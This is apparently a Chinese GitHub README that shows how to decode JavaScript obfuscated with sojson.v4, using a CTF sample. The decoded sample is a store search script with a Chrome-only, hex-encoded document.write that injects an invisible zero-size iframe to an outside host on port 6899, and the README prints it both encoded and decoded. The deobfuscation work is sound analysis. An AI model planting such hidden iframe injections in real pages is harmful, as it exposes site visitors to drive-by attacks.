# sojson.v4-decode
sojson.v4 step by step decode

因为在一次比赛中见到了sojson.v4,就想着怎么解码。

## 原始代码
``` javascript
['sojson.v4']["\x66\x69\x6c\x74\x65\x72"]["\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"](((['sojson.v4']+[])["\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"]['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65']['\x61\x70\x70\x6c\x79'](null,"118r97A。。。41u59"['\x73\x70\x6c\x69\x74'](/[a-zA-Z]{1,}/))))('sojson.v4');
```

可以看出来，sojson.v4是对js脚本使用了unicode编码，在python中就可以解码了。
粘贴到Python控制台，得到
## unicode解码
``` javascript
['sojson.v4']["filter"]["constructor"](((['sojson.v4']+[])["constructor"]['fromCharCode']['apply'](null,"118r...o41u59"['split'](/[a-zA-Z]{1,}/))))('sojson.v4');
```

可以看到，括号中的null之后，是用随机字母分割的char数值，使用js的 String.fromCharCode方法解密。

## js脚本charcode解码
其中的"118r...o41u59"，可以发现，规律是每两串数字之间是一个大小写字母，写脚本解密
``` python 
>>>s='"118r...o41u59"'
>>> ss = re.sub(r'[a-zA-Z]',' ',s)
>>> sss = ss.split()
>>> for i in sss:
...   if int(i) < 256:
...     x += chr(int(i))
...   else:
...     x += 'UUUU'
```
### js脚本里的unicode解码

解密后的脚本里面有中文unicode，其实无需转换。如果一定要转。这么来。

``` python
>>> for i in sss:
...   if int(i) < 256:
...     x += chr(int(i))
...   else:
...     xx = "'\u"+hex(int(i))[2:]+"'"
...     x += xx.decode('unicode-escape')

> print x
var controller = $('#search ul.tab').attr('dstype');
    if (controller == "Storelist") {
        $('#search ul.tab li span').eq(0).html('店铺');
        $('#search ul.tab li span').eq(1).html('商品');
        $('#search-form').attr("action", HOMESITEURL + "/Storelist/index.html");
    } else {
        $('#search ul.tab li span').eq(0).html('商品');
        $('#search ul.tab li span').eq(1).html('店铺');


        $('#search-form').attr("action", HOMESITEURL + "/Search/index.html");
    }
	var u1=navigator['\x75\x73\x65\x72\x41\x67\x65\x6e\x74'];if(u1['\x69\x6e\x64\x65\x78\x4f\x66']("\x43\x68\x72\x6f\x6d\x65")>-1){window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]['\x77\x72\x69\x74\x65']('\x3c\x69\x66\x72\x61\x6d\x65 \x73\x72\x63\x3d\x22\x68\x74\x74\x70\x3a\x2f\x2f\x77\x77\x77\x2e\x63\x72\x63\x37\x30\x32\x2e\x63\x6f\x6d\x3a\x36\x38\x39\x39\x2f\x22 \x62\x6f\x72\x64\x65\x72\x3d\x22\x31\x22 \x66\x72\x61\x6d\x65\x62\x6f\x72\x64\x65\x72\x3d\x22\x31\x22 \x77\x69\x64\x74\x68\x3d\x22\x30\x22 \x68\x65\x69\x67\x68\x74\x3d\x22\x30\x22\x3e\x3c\x2f\x69\x66\x72\x61\x6d\x65\x3e');var _rbJaSzj2="\x54\x68\x69\x73\x5f\x69\x73\x5f\x61\x5f\x66\x6c\x61\x67"}
    $('#search').hover(function() {
        $('#search ul.tab li').eq(1).show();
        $('#search ul.tab li i').addClass('over').removeClass('arrow');
    }, function() {
        $('#search ul.tab li').eq(1).hide();
        $('#search ul.tab li i').addClass('arrow').removeClass('over');
    });
    $('#search ul.tab li').eq(1).click(function() {
        $(this).hide();
        if ($(this).find('span').html() == '店铺') {
            $('#keyword').attr("placeholder", "请输入您要搜索的店铺关键字");
            $('#search ul.tab li span').eq(0).html('店铺');
            $('#search ul.tab li span').eq(1).html('商品');
            $('#search-form').attr("action", HOMESITEURL+"/Storelist/index.html");
        } else {
            $('#keyword').attr('placeholder', '请输入您要搜索的商品关键字');
            $('#search ul.tab li span').eq(0).html('商品');
            $('#search ul.tab li span').eq(1).html('店铺');


            $('#search-form').attr("action", HOMESITEURL+"/Search/index.html");
        }
        $("#keyword").focus();
    });

});
```
### 还有一段unicode编码
其中的navigator段代码，做了unicode编码，解开即可。
``` python
>>> print '''windows["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]['\x77\x72\x69\x74\x65']('\x3c\x69\x66\x72\x61\x6d\x65 \x73\x72\x63\x3d\x22\x68\x74\x74\x70\x3a\x2f\x2f\x77\x77\x77\x2e\x63\x72\x63\x37\x30\x32\x2e\x63\x6f\x6d\x3a\x36\x38\x39\x39\x2f\x22 \x62\x6f\x72\x64\x65\x72\x3d\x22\x31\x22 \x66\x72\x61\x6d\x65\x62\x6f\x72\x64\x65\x72\x3d\x22\x31\x22 \x77\x69\x64\x74\x68\x3d\x22\x30\x22 \x68\x65\x69\x67\x68\x74\x3d\x22\x30\x22\x3e\x3c\x2f\x69\x66\x72\x61\x6d\x65\x3e');var _rbJaSzj2="\x54\x68\x69\x73\x5f\x69\x73\x5f\x61\x5f\x66\x6c\x61\x67"}'''
windows["document"]['write']('<iframe src="http://www.crc702.com:6899/" border="1" frameborder="1" width="0" height="0"></iframe>');var _rbJaSzj2="This_is_a_flag"}
```

### 合并了一个js版本的脚本
可以实现解密，可能需要修改一下，以适应使用。[sv4.js](https://github.com/jinqiy/sojson.v4-decode/blob/master/sv4.js)
感谢来自 [liulihaocai](https://github.com/liulihaocai) 的贡献。
``` javascript
function decsojson4(jsf) {
    var head="['sojson.v4']"
    if(jsf.indexOf(head)==-1){return "Failed!\nGiven code is not encoded as Sojson v4."}
    args=jsf.substring(240,jsf.length-58).split(/[a-zA-Z]{1,}/)
    var str="";
    for(var i=0;i<args.length;i++){
        str+=String.fromCharCode(args[i])
    }
    return str
}
```


